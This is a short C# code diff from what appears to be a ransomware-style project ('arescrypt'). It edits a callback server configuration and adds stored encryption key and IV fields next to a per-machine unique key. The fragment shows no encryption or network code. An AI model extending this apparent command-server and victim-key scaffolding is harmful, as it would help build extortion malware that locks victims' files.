@@ -28,19 +28,21 @@
         // Variables to be set by GetDATFileData()
         // Server Data
         public static string callbackServer = "localhost";
-        public static int callbackPort = 9000;
+        public static int callbackPort = 0x2328; // 9000
         public static string callbackURL = "http://" + callbackServer + "/arescrypt.php";
     }
 
     class UserData
     {
         public string uniqueKey { get; set; }
+        public string encKey { get; set; }
+        public string encIV { get; set; }
 
         public string getUniqueKey()
         {
             if (!System.IO.File.Exists(Configuration.datFileLocation))
             {
-                this.uniqueKey = Cryptography.genRandomString(0xC);
+                this.uniqueKey = Cryptography.genRandomString(0xC); // 0xC = 12
                 Miscellaneous.SetDATFileData(this);
             }
             else
